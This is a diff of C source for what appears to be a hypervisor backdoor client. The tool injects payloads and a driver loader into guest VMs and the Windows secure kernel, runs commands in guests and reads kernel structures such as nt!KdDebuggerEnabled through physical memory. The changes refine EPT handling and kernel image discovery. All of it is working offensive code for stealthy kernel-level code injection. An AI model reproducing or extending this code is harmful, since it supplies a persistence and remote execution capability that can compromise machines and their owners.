@@ -89,17 +89,25 @@ int check_loader_image(uint8_t *loader, int loader_size)
 int backdoor_vm_inject(uint64_t pml4_addr, uint64_t *payload_addr, uint8_t *payload, int payload_size, bool report_error)
 {
     int ret = -1;
-    uint64_t phys_addr = 0, cr3 = 0;
+    uint64_t phys_addr = 0, current_cr3 = 0, current_ept = 0;
     uint8_t *saved_data = NULL;
+    void *data = NULL;
     bool alloc_only = (payload == NULL);    
 
     // read current cr3 value
-    if (backdoor_vmread(GUEST_CR3, &cr3) != 0)
+    if (backdoor_vmread(GUEST_CR3, &current_cr3) != 0)
     {
         return -1;
     }
 
-    printf("[+] Current CR3 value is 0x%.16llx\n", cr3);
+    // read current EPT address
+    if (backdoor_ept_addr(&current_ept) != 0)
+    {
+        return -1;
+    }
+
+    printf("[+] Current CR3 value is 0x%.16llx\n", current_cr3);
+    printf("[+] Current EPT address is 0x%.16llx\n", current_ept);
 
     int loader_size = sizeof(driver_loader_sys);
     uint8_t *loader = driver_loader_sys;    
@@ -124,7 +132,7 @@ int backdoor_vm_inject(uint64_t pml4_addr, uint64_t *payload_addr, uint8_t *payl
         }
 
         // allocate memory for the payload physical memory map
-        payload_map_size = sizeof(uint64_t)* (payload_mem_size / PAGE_SIZE);
+        payload_map_size = sizeof(uint64_t) * (payload_mem_size / PAGE_SIZE);
         if ((payload_map = (uint64_t *)malloc(payload_map_size)) == NULL)
         {
             goto _end;
@@ -137,7 +145,7 @@ int backdoor_vm_inject(uint64_t pml4_addr, uint64_t *payload_addr, uint8_t *payl
             m_quiet = true;
 
             // get payload memory page physical address
-            if (backdoor_virt_translate((uint64_t)(payload_mem + (i * PAGE_SIZE)), &payload_map[i], cr3, pml4_addr) != 0)
+            if (backdoor_virt_translate((uint64_t)(payload_mem + (i * PAGE_SIZE)), &payload_map[i], current_cr3, current_ept) != 0)
             {
                 m_quiet = false;
 
@@ -150,8 +158,7 @@ int backdoor_vm_inject(uint64_t pml4_addr, uint64_t *payload_addr, uint8_t *payl
         }
     }
 
-    void *data = malloc(PAGE_SIZE);
-    if (data == NULL)
+    if ((data = malloc(PAGE_SIZE)) == NULL)
     {
         goto _end;
     }
@@ -244,10 +251,10 @@ int backdoor_vm_inject(uint64_t pml4_addr, uint64_t *payload_addr, uint8_t *payl
 
                 IMAGE_SECTION_HEADER *sec_curr = sec;
 
-                // look for the PAGEKD section
+                // look for the PAGEVRFY section, HAL doesn't have it
                 for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
                 {
-                    if (!strncmp((char *)&sec_curr->Name, "PAGEKD", 6))
+                    if (!strncmp((char *)&sec_curr->Name, "PAGEVRFY", 8))
                     {
                         // HalpLMStub() points to the kernel image!
                         nt_base_virt = hal_base_virt;
@@ -361,7 +368,7 @@ _nt_found:
     uint32_t nt_init_addr = 0, nt_init_size = 0;
     uint32_t nt_pagekd_addr = 0, nt_pagekd_size = 0;
 
-    while (ptr < PAGE_SIZE * 0x100)
+    while (ptr < PAGE_SIZE * 0x200)
     {
         m_quiet = true;
 
@@ -467,7 +474,7 @@ _nt_found:
 
     uint64_t nt_func_virt = 0, nt_kd_virt = 0;
     uint64_t nt_func_phys = 0, nt_kd_phys = 0;
-    uint64_t debugger_enabled = 0;
+    uint8_t debugger_enabled = 0;
 
     nt_size = _ALIGN_UP(nt_size, PAGE_SIZE);
 
@@ -524,7 +531,7 @@ _nt_found:
         // get nt!KdDebuggerEnabled virtual address
         if ((rva = LdrGetProcAddress(nt_image, "KdDebuggerEnabled")) == 0)
         {
-            printf("ERROR: Unable to locate nt!KdDebuggerEnabled()\n");
+            printf("ERROR: Unable to locate nt!KdDebuggerEnabled\n");
 
             m_quiet = false;
 
@@ -553,7 +560,7 @@ _nt_found:
     }
 
     // get nt!KdDebuggerEnabled value
-    if (backdoor_phys_read_64(nt_kd_phys, &debugger_enabled) != 0)
+    if (backdoor_phys_read_8(nt_kd_phys, &debugger_enabled) != 0)
     {
         goto _end;
     }
@@ -835,7 +842,7 @@ _nt_found:
             break;
         }
 
-        bd_yeld();
+        bd_sleep(1000);
     }
 
     // read allocated image address
@@ -1133,7 +1140,7 @@ int backdoor_vm_exec(uint64_t pml4_addr, char *command)
             break;
         }
 
-        bd_yeld();
+        bd_sleep(1000);
     }
 
     printf("[+] Command output address is %p (%d bytes)\n", exec_struct.output, exec_struct.output_size);
@@ -2216,7 +2223,7 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
             break;
         }
 
-        bd_yeld();
+        bd_sleep(1000);
     }
 
     if (image_addr != 0)
@@ -2712,6 +2719,10 @@ int _tmain(int argc, _TCHAR* argv[])
         else if (!strcmp(command, "--ept-list"))
         {
             EPT_INFO ept_list[EPT_MAX_COUNT];
+            uint64_t ept_current = 0;
+
+            // get current EPT address
+            backdoor_ept_addr(&ept_current);
 
             if (backdoor_ept_list(ept_list) == 0)
             {
@@ -2722,8 +2733,9 @@ int _tmain(int argc, _TCHAR* argv[])
                     if (ept_list[i].Addr != EPT_NONE)
                     {
                         printf(
-                            "  #%.2d: VPID = 0x%.4x, EPT = 0x%.16llx\n", 
-                            i, ept_list[i].Vpid, ept_list[i].Addr
+                            "  #%.2d: VPID = 0x%.4x, EPT = 0x%.16llx %s\n", 
+                            i, ept_list[i].Vpid, ept_list[i].Addr,
+                            (ept_list[i].Addr == ept_current) ? "[current]" : ""
                         );
                     }        
                 }
@@ -2923,7 +2935,7 @@ int _tmain(int argc, _TCHAR* argv[])
                             if (backdoor_sk_base(entry, &sk_addr, NULL) == 0)
                             {
                                 // inject driver into the secure kernel
-                                backdoor_sk_inject(entry, sk_addr, NULL, driver, st.st_size);;                                
+                                backdoor_sk_inject(entry, sk_addr, NULL, driver, st.st_size);                              
                             }
                             else
                             {
